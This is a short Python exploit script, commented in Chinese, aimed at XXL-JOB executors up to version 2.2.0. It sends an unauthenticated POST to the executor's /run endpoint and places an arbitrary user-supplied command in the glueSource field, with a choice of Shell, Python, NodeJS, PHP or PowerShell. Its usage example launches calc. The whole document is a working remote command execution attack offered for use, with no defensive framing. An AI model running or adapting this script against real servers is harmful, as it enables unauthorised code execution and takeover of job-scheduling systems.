#xxl-job未授权加命令执行漏洞支持 =<v2.2.0版本
#支持脚本语言有Shell、Python、NodeJS、PHP、PowerShell
#windows推荐使用PowerShell,Linux推荐使用shell
#如果不行可尝试其它方式，前提是环境支持


import requests
import argparse
import time
import sys

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def exp(url,cmd,method):
    times = round(time.time() * 1000)
    headers = {'X-Requested-With': 'XMLHttpRequest',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept-Encoding': 'gzip, deflate'}
    data = '''{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_'''+method+'''",
  "glueSource": "'''+cmd+'''",
  "glueUpdatetime":''' +str(times)+''',
  "broadcastIndex": 0,
  "broadcastTotal": 0
}'''



    response = requests.post(url=url+"/run",headers=headers,data=data)
    if response.status_code == 200:
        print("commond excute success")
    else:
        print("access failed")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='python3 xxl-job-rce.py [IP Address] -p [Prot(default 9999)] -c [Command] -m[Ccript Method(default powershell)]',
                                     epilog='Use:python3 xxl-job-poc.py 192.168.229.146 -c calc')
    parser.add_argument('address', nargs='*',help='Destination IP address')
    parser.add_argument('-p', '--port',default=9999)
    parser.add_argument('-c', '--commond')
    parser.add_argument('-m', '--method',default="powershell",help="Shell、Python、NodeJS、PHP、PowerShell")
    args = parser.parse_args()
    url = 'http://'+args.address[0]+':'+str(args.port)
    method = args.method.upper()
    exp(url,args.commond,method)
